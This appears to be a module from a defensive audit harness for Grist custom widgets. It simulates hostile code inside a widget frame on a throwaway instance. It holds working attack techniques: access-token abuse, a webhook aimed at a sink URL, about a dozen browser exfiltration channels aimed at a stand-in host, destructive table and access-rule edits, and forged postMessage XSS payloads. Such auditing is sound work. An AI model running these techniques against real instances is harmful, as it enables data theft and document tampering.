/**
 * Le « kit de la dépendance piégée » : ce que ferait, avec le niveau d'accès réellement accordé au widget, du code étranger qui
 * s'exécute DANS le cadre du widget (une bibliothèque dont le mainteneur est piraté, un CDN compromis). Il est joué par `evaluate`
 * dans le cadre du widget chargé par le vrai Grist : même contexte JavaScript que le widget, mêmes droits, même politique de
 * sécurité (CSP) pour ses appels réseau, qu'une bibliothèque piégée subirait elle aussi.
 *
 * Il ne fait que des essais mesurables, sur l'instance jetable : lire (liste des tables, table appât, tables système), demander un
 * jeton d'accès, appeler l'API du document avec ce jeton (liste des tables, SQL, un AUTRE document de l'instance), tenter de créer
 * un webhook. Aucune écriture dans les données, aucune destruction. Il ne rend que des faits (jamais le jeton lui-même).
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{appat: string, table: string, prefixe: string, autreDoc: string|null, canariAutre: string|null, puits: string}} p
 */
export async function kitDependancePiegee(p) {
  const fin = Date.now() + 20_000;
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 200);
  const avec = (promesse) => Promise.race([promesse, new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), Math.max(1000, Math.min(6000, fin - Date.now()))))]);
  const essayer = async (f) => { try { return { ok: true, ...(await avec(f())) }; } catch (e) { return { ok: false, erreur: court(e) }; } };

  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 5) violations.push(`${e.violatedDirective} ${String(e.blockedURI).slice(0, 80)}`); });
  const sortie = { grist: !!(window.grist && window.grist.docApi), violations };
  if (!sortie.grist) return sortie;

  const lire = (id) => essayer(async () => {
    const t = await window.grist.docApi.fetchTable(id);
    const cles = Object.keys(t || {});
    return { colonnes: cles.length, lignes: cles.length ? (t[cles[0]] || []).length : 0, canari: JSON.stringify(t).includes(p.prefixe) };
  });
  sortie.tables = await essayer(async () => ({ nombre: (await window.grist.docApi.listTables()).length }));
  sortie.appat = await lire(p.appat);
  sortie.systeme = {};
  for (const t of ['_grist_Tables_column', '_grist_ACLRules', '_grist_Views_section']) sortie.systeme[t] = await lire(t);

  const jeton = async (readOnly) => {
    let j = null;
    const r = await essayer(async () => { j = await window.grist.docApi.getAccessToken({ readOnly }); return { dureeMs: j.ttlMs }; });
    return { r, j };
  };
  const appeler = (methode, url, corps) => essayer(async () => {
    const r = await fetch(url, { method: methode, headers: corps ? { 'content-type': 'application/json' } : {}, body: corps ? JSON.stringify(corps) : undefined });
    const texte = await r.text();
    let json = null; try { json = JSON.parse(texte); } catch { /* corps non JSON */ }
    return { statut: r.status, erreurGrist: json && typeof json.error === 'string' ? json.error.slice(0, 120) : null, texte: texte.slice(0, 20000) };
  });
  const sansTexte = (r) => { const { texte, ...reste } = r; return reste; };

  const lecture = await jeton(true);
  sortie.jetonLecture = lecture.r;
  if (lecture.j) {
    const { token, baseUrl } = lecture.j;
    const auth = `?auth=${encodeURIComponent(token)}`;
    const tables = await appeler('GET', `${baseUrl}/tables${auth}`);
    sortie.tablesRest = { ...sansTexte(tables), cite: tables.ok && tables.statut === 200 && tables.texte.includes(p.table) };
    const sql = await appeler('POST', `${baseUrl}/sql${auth}`, { sql: 'select id, tableId from _grist_Tables' });
    sortie.sql = { ...sansTexte(sql), cite: sql.ok && sql.statut === 200 && sql.texte.includes(p.table) };
    if (p.autreDoc) {
      const autre = await appeler('GET', `${baseUrl.replace(/\/docs\/[^/]+$/, `/docs/${p.autreDoc}`)}/tables${auth}`);
      sortie.autreDoc = { ...sansTexte(autre), canari: autre.ok && !!p.canariAutre && autre.texte.includes(p.canariAutre) };
    }
  }

  const ecriture = await jeton(false);
  sortie.jetonEcriture = ecriture.r;
  if (ecriture.j) {
    const { token, baseUrl } = ecriture.j;
    const auth = `?auth=${encodeURIComponent(token)}`;
    const w = await appeler('POST', `${baseUrl}/webhooks${auth}`, { webhooks: [{ fields: { name: 'gwaudit', url: p.puits, enabled: true, eventTypes: ['add', 'update'], tableId: p.table } }] });
    const id = w.ok && w.statut === 200 && /"id"\s*:\s*"/.test(w.texte) ? (w.texte.match(/"id"\s*:\s*"([^"]+)"/) || [])[1] : null;
    sortie.webhook = { ...sansTexte(w), cree: !!id };
    if (id) {
      const liste = await appeler('GET', `${baseUrl}/webhooks${auth}`);
      sortie.webhook.listeContientLeWebhook = liste.ok && liste.texte.includes(id);
    }
  }
  return sortie;
}

/**
 * Les canaux de sortie : par quelles voies du navigateur du code étranger, qui s'exécute dans le cadre du widget, pourrait envoyer ce qu'il
 * a lu vers un hôte extérieur. Chaque voie est tentée une fois, vers un hôte factice que l'audit intercepte (rien ne sort de la machine),
 * avec un marqueur unique dans l'adresse : l'audit voit côté réseau quelles tentatives ont abouti, et ici quelles tentatives la politique de
 * sécurité (CSP) du widget a arrêtées. Jouée dans une passe à part : ces requêtes ne se mêlent pas à celles du widget (essai 13).
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{hote: string, prefixe: string}} p
 */
export async function kitCanaux(p) {
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 60) violations.push({ directive: e.violatedDirective, bloque: String(e.blockedURI).slice(0, 200) }); });
  const marque = (nom) => `${p.prefixe}-CANAL-${nom.toUpperCase()}`;
  // Un sous-domaine par voie : Chromium ne rapporte que l'origine d'un cadre bloqué, le nom de la voie doit s'y lire.
  const url = (nom) => `https://${nom}.${p.hote}/c?d=${marque(nom)}`;
  const racine = () => document.body || document.documentElement;
  const tete = () => document.head || document.documentElement;
  const tentatives = {};
  const reseau = {};
  const essayer = (nom, f) => {
    try { const r = f(); if (r && typeof r.catch === 'function') r.catch(() => {}); tentatives[nom] = 'lancee'; }
    catch (e) { tentatives[nom] = `exception : ${String((e && e.message) || e).slice(0, 100)}`; }
  };
  const lier = (nom, rel) => { const l = document.createElement('link'); l.rel = rel; l.href = url(nom); tete().appendChild(l); };

  essayer('fetch', () => fetch(url('fetch'), { mode: 'no-cors' }));
  essayer('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', url('xhr')); x.send(); });
  essayer('image', () => { new Image().src = url('image'); });
  essayer('beacon', () => navigator.sendBeacon(url('beacon'), marque('beacon')));
  // Vraie WebSocket (la passe n'intercepte pas celles-ci : l'interception de Playwright les soustrait à la CSP) : si aucune CSP ne l'arrête, la connexion est tentée puis échoue faute de DNS.
  essayer('websocket', () => { const w = new WebSocket(url('websocket').replace(/^https/, 'wss')); w.onerror = () => { reseau.websocket = 'tentative'; }; w.onclose = () => { reseau.websocket = reseau.websocket || 'tentative'; }; });
  essayer('script', () => { const s = document.createElement('script'); s.src = url('script'); tete().appendChild(s); });
  essayer('iframe', () => { const f = document.createElement('iframe'); f.hidden = true; f.src = url('iframe'); racine().appendChild(f); });
  essayer('feuille', () => lier('feuille', 'stylesheet'));
  essayer('cssurl', () => { const d = document.createElement('div'); d.style.cssText = `width:1px;height:1px;background-image:url("${url('cssurl')}")`; racine().appendChild(d); });
  essayer('prefetch', () => lier('prefetch', 'prefetch'));
  essayer('formulaire', () => {
    const cadre = document.createElement('iframe'); cadre.name = 'gw_canal_formulaire'; cadre.hidden = true; racine().appendChild(cadre);
    const f = document.createElement('form'); f.method = 'POST'; f.action = url('formulaire'); f.target = 'gw_canal_formulaire';
    const i = document.createElement('input'); i.name = 'd'; i.value = marque('formulaire'); f.appendChild(i); racine().appendChild(f); f.submit();
  });
  await new Promise((r) => setTimeout(r, 2000));
  // En dernier : la navigation du cadre lui-même vers l'extérieur (aucune CSP ne la ferme).
  essayer('navigation', () => { location.replace(url('navigation')); });
  await new Promise((r) => setTimeout(r, 800));
  return { tentatives, violations, reseau };
}

/**
 * Les écritures : ce que du code étranger dans le cadre du widget pourrait changer dans le document avec le niveau d'accès accordé. Chaque
 * effet vise sa propre table sacrifiée (voir TABLES_SACRIFIEES dans donnees.js) ; l'audit vérifie ensuite côté serveur ce qui a changé, il ne
 * croit pas ce que cette fonction rapporte. L'écriture d'une règle d'accès est la dernière : Grist recharge alors la page, le cadre disparaît et
 * `evaluate` échoue : c'est attendu.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{ajout: string, renom: string, colonne: string, table: string, regle: string}} p identifiants des tables sacrifiées
 */
export async function kitEcritures(p) {
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 200);
  const sortie = { grist: !!(window.grist && window.grist.docApi) };
  if (!sortie.grist) return sortie;
  const agir = async (actions) => {
    try { await Promise.race([window.grist.docApi.applyUserActions(actions), new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), 8000))]); return { ok: true }; }
    catch (e) { return { ok: false, erreur: court(e) }; }
  };
  sortie.ajout = await agir([['AddRecord', p.ajout, null, { Valeur: 'ajout-audit', Autre: 'x' }]]);
  sortie.renom = await agir([['RenameColumn', p.renom, 'Valeur', 'ValeurRenommee']]);
  sortie.colonne = await agir([['RemoveColumn', p.colonne, 'Autre']]);
  sortie.table = await agir([['RemoveTable', p.table]]);
  sortie.regle = await agir([['AddRecord', '_grist_ACLResources', -1, { tableId: p.regle, colIds: '*' }], ['AddRecord', '_grist_ACLRules', null, { resource: -1, aclFormula: '', permissionsText: '-R', rulePos: 100 }]]);
  return sortie;
}

/**
 * Les droits du navigateur donnés au cadre du widget : ce que la politique d'autorisations (Permissions-Policy) de Chromium laisse faire à du
 * code étranger dans ce cadre (caméra, micro, position, partage d'écran, presse-papier…). La politique est celle que Grist fixe par l'attribut
 * `allow` du cadre, rétrécie au besoin par les en-têtes du widget : c'est la politique réellement appliquée, lue dans le cadre.
 * Pour le presse-papier, l'essai va jusqu'au bout : après un vrai clic dans le widget (fait par l'audit, voir `poserSurfaceDeClic`), le cadre écrit
 * un texte de test, que l'audit relit depuis la page Grist. La lecture du presse-papier par le cadre n'est pas tentée : la politique dit si Grist la lui délègue.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{marqueur: string}} p texte de test écrit par le cadre
 */
export async function kitDroits(p) {
  const court = (m) => String((m && m.message) || m).replace(/\s+/g, ' ').slice(0, 220);
  const avec = (promesse) => Promise.race([promesse, new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), 4000))]);
  const sortie = { activation: !!(navigator.userActivation && navigator.userActivation.isActive), politique: null, connues: null };
  const pol = document.permissionsPolicy || document.featurePolicy;
  try { if (pol && typeof pol.allowedFeatures === 'function') { sortie.politique = pol.allowedFeatures().map(String).sort(); sortie.connues = typeof pol.features === 'function' ? pol.features().map(String).sort() : null; } }
  catch (e) { sortie.erreurPolitique = court(e); }
  const essayer = async (f) => { try { return { ok: true, ...(await avec(f())) }; } catch (e) { return { ok: false, erreur: court(e) }; } };
  if (!navigator.clipboard) return { ...sortie, ecriture: { ok: false, erreur: 'navigator.clipboard absent' } };
  sortie.ecriture = await essayer(async () => { await navigator.clipboard.writeText(p.marqueur); return {}; });
  return sortie;
}

/**
 * Pose, dans le cadre du widget, une petite surface transparente en haut à gauche, par-dessus tout : le clic réel que fait ensuite l'audit tombe
 * sur elle et non sur un bouton du widget, qu'il ne déclenche donc pas. Rend la place disponible dans le cadre.
 */
export function poserSurfaceDeClic() {
  const d = document.createElement('div');
  d.style.cssText = 'position:fixed;left:0;top:0;width:12px;height:12px;opacity:0;z-index:2147483647';
  (document.body || document.documentElement).appendChild(d);
  return { largeur: window.innerWidth, hauteur: window.innerHeight };
}

/**
 * Pollution des prototypes (essai 3) : après que le widget a reçu les lignes hostiles (voir `lignesHostiles` dans donnees.js), les clés qu'elles
 * tentaient d'ajouter à `Object.prototype` y sont-elles ? Une clé ne peut y être que par ces données : le fait est prouvé, jamais déduit.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{cles: string[]}} p
 */
export function kitPollution(p) {
  const polluees = p.cles.filter((cle) => Object.prototype.hasOwnProperty.call(Object.prototype, cle) || ({})[cle] !== undefined);
  return { polluees };
}

/**
 * Stockage dans le navigateur (essai 23) : le widget a-t-il gardé des données du document dans le navigateur (localStorage, sessionStorage,
 * IndexedDB), où elles survivent à la fermeture du document et sont lisibles par tout code de la même origine (les autres widgets du même hébergeur
 * par exemple) ? On cherche les canaris et les valeurs ordinaires du document de test ; on rend les faits (noms, nombres), jamais les contenus.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{prefixe: string, valeurs: string[]}} p
 */
export async function kitStockage(p) {
  const contient = (texte) => { const t = String(texte); return t.includes(p.prefixe) || p.valeurs.some((v) => t.includes(v)); };
  const lireStockage = (nom) => {
    try {
      const st = window[nom];
      const cles = []; let canari = false; let taille = 0;
      for (let i = 0; i < Math.min(st.length, 500); i++) { const k = st.key(i); const v = st.getItem(k) ?? ''; taille += k.length + v.length; if (cles.length < 20) cles.push(String(k).slice(0, 60)); if (contient(k) || contient(v)) canari = true; }
      return { nombre: st.length, cles, taille, canari };
    } catch (e) { return { erreur: String((e && e.message) || e).slice(0, 120) }; }
  };
  const lireIndexedDB = async () => {
    if (!window.indexedDB || typeof indexedDB.databases !== 'function') return { indisponible: true };
    try {
      const bases = (await indexedDB.databases()).filter((b) => b && b.name);
      const sortie = { nombre: bases.length, noms: bases.slice(0, 20).map((b) => String(b.name).slice(0, 60)), canari: false };
      for (const b of bases.slice(0, 10)) {
        await new Promise((fin) => {
          const garde = setTimeout(fin, 2500);
          const fermer = (db) => { try { if (db) db.close(); } catch { /* déjà fermée */ } clearTimeout(garde); fin(); };
          let req; try { req = indexedDB.open(b.name); } catch { clearTimeout(garde); return fin(); }
          req.onerror = () => fermer(null);
          req.onsuccess = () => {
            const db = req.result;
            try {
              const magasins = [...db.objectStoreNames]; let restant = magasins.length;
              if (!restant) return fermer(db);
              const un = () => { restant -= 1; if (restant <= 0) fermer(db); };
              for (const m of magasins) {
                const r = db.transaction(m, 'readonly').objectStore(m).getAll(undefined, 200);
                r.onsuccess = () => { try { if (contient(JSON.stringify(r.result))) sortie.canari = true; } catch { /* valeur non sérialisable */ } un(); };
                r.onerror = un;
              }
            } catch { fermer(db); }
          };
        });
      }
      return sortie;
    } catch (e) { return { erreur: String((e && e.message) || e).slice(0, 120) }; }
  };
  const caches = async () => { try { return window.caches ? (await window.caches.keys()).slice(0, 20).map((k) => String(k).slice(0, 60)) : null; } catch { return null; } };
  return { local: lireStockage('localStorage'), session: lireStockage('sessionStorage'), indexedDB: await lireIndexedDB(), caches: await caches() };
}

/**
 * Messages forgés (essai 4) : un cadre voisin sans aucun droit (autre widget de la même page, page tierce qui encadrerait le widget) lui envoie des
 * messages `postMessage` qu'aucun contrôle d'origine ne peut croire : le widget les prend-il pour des ordres ? Joué dans la PAGE Grist (pas dans le
 * cadre du widget) : un cadre `sandbox` à l'origine opaque (« null ») pose les messages dans le cadre du widget, sous quatre formes (texte brut,
 * objet à plat, objet imbriqué, JSON en texte) et sous les noms de champs usuels. Chaque charge est un `<img onerror>` qui compte ses exécutions
 * dans `window.__gw_msg` du widget, et chaque champ d'adresse vise un hôte factice intercepté par l'audit.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{hote: string, marqueur: string}} p
 */
export async function kitMessagesForges(p) {
  const widget = document.querySelector('iframe.custom_view');
  if (!widget || !widget.contentWindow) return { erreur: 'cadre du widget introuvable dans la page' };
  let indice = -1;
  for (let i = 0; i < window.length; i++) { try { if (window.frames[i] === widget.contentWindow) indice = i; } catch { /* cadre inaccessible */ } }
  if (indice < 0) return { erreur: "le cadre du widget n'est pas dans la liste des cadres de la page" };
  const charge = '<img src=x onerror="window.__gw_msg=(window.__gw_msg||0)+1">';
  const adresse = `https://${p.hote}/m?d=${p.marqueur}`;
  const plat = {};
  for (const cle of ['html', 'innerHTML', 'text', 'message', 'msg', 'content', 'data', 'value', 'body', 'label', 'title', 'name']) plat[cle] = charge;
  for (const cle of ['url', 'href', 'src', 'link', 'redirect', 'location', 'endpoint', 'api']) plat[cle] = adresse;
  for (const cle of ['type', 'action', 'cmd', 'command', 'event', 'method']) plat[cle] = 'update';
  const messages = [charge, plat, { type: 'message', data: plat, payload: plat, detail: plat, args: [plat] }, JSON.stringify(plat)];
  const corps = JSON.stringify(messages).replace(/</g, '\\u003c');
  const cadre = document.createElement('iframe');
  cadre.setAttribute('sandbox', 'allow-scripts');
  cadre.hidden = true;
  cadre.srcdoc = `<script>try{var w=parent.frames[${indice}];var m=${corps};for(var i=0;i<m.length;i++)w.postMessage(m[i],"*");parent.postMessage("gw-envoye","*")}catch(e){parent.postMessage("gw-erreur "+String(e&&e.message).slice(0,100),"*")}</scr` + 'ipt>';
  const retour = await new Promise((fin) => {
    const garde = setTimeout(() => fin('délai dépassé'), 5000);
    window.addEventListener('message', (e) => { if (e.source === cadre.contentWindow && String(e.data).startsWith('gw-')) { clearTimeout(garde); fin(String(e.data)); } });
    document.body.appendChild(cadre);
  });
  return { envoye: retour === 'gw-envoye', retour, formes: messages.length };
}

/**
 * API de l'instance appelée depuis le cadre (essai 20) : du code qui s'exécute dans le cadre du widget (origine différente de celle de Grist) peut-il
 * lire le document par l'API REST de l'instance AVEC la session de la personne (`credentials: 'include'`), sans passer par le niveau d'accès que Grist
 * accorde au widget ? Joué deux fois : dans le cadre du widget (l'essai) et dans la page Grist (le témoin : même appel, même origine que Grist, qui doit
 * réussir, sans quoi un échec dans le cadre ne prouverait rien). On ne regarde que la présence d'un canari dans la réponse, jamais son contenu.
 *
 * Fonction autonome : Playwright la sérialise, elle ne peut rien utiliser qui soit défini hors d'elle.
 * @param {{base: string, docId: string, table: string, prefixe: string}} p
 */
export async function kitApiInstance(p) {
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => { if (violations.length < 5) violations.push(String(e.violatedDirective)); });
  const lire = async (chemin) => {
    try {
      const r = await Promise.race([fetch(p.base + chemin, { credentials: 'include' }), new Promise((_, rejet) => setTimeout(() => rejet(new Error('délai dépassé')), 6000))]);
      const texte = await r.text();
      return { statut: r.status, canari: texte.includes(p.prefixe) };
    } catch (e) { return { erreur: String((e && e.message) || e).slice(0, 100) }; }
  };
  const sortie = {};
  sortie.records = await lire(`/api/docs/${p.docId}/tables/${p.table}/records`);
  sortie.sql = await lire(`/api/docs/${p.docId}/sql?q=${encodeURIComponent(`select GwauditCanari from ${p.table}`)}`);
  await new Promise((r) => setTimeout(r, 200));
  sortie.violations = violations;
  return sortie;
}
